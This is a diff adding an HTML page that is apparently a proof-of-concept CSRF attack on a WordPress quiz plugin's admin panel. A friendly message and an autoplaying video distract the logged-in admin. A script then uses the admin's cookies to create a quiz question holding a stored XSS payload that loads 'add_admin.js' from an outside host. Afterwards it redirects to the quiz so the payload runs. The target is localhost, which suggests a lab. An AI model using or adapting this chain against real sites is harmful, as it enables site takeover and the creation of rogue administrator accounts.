@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<body>
+    <p style="display: none;">I will send CSRF to admin page and make new quiz</p>
+    <h4>Hello Admin I know you are tired. Here is some food for you</h4>
+
+    <iframe width="1120" height="630" 
+        src="https://www.youtube.com/embed/wsIPKJYwGpM?autoplay=1&amp;si=jw-ER3ybo-AzMW8i&amp;controls=0" allow="autoplay"
+        title="YouTube video player" frameborder="0" 
+        allow="autoplay; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+        referrerpolicy="strict-origin-when-cross-origin" 
+        allowfullscreen></iframe>
+</body>
+
+<script>
+    //Create quiz with malicious payload
+    let quizID=34;
+    let pageName='exam-34'
+    let payload = new URLSearchParams({
+        question_type: '0',
+        question_name: 'HACKED',
+        correct_answer_info: '',
+        hint: '',
+        answer_1: '<script src="https://owasp.arianamiri.com/add_admin.js"><\/script>',
+        answer_1_points: '0',
+        comments: '1',
+        new_question_order: '1',
+        required: '0',
+        new_category: '', //or new_category
+        new_question_answer_total: '1',
+        question_submission: 'new_question',
+        quiz_id: quizID,
+        question_id: '0'
+
+    })
+    fetch(`http://localhost:8000/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=${quizID}`, {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: payload.toString()
+    }).finally(()=> {
+        setTimeout(() => {
+            //visit malicious quiz to execute the payload
+            window.location.href= `http://localhost:8000/?quiz=${pageName}`
+        }, 15000); //wait for 10 seconds
+    });
+
+</script>
+
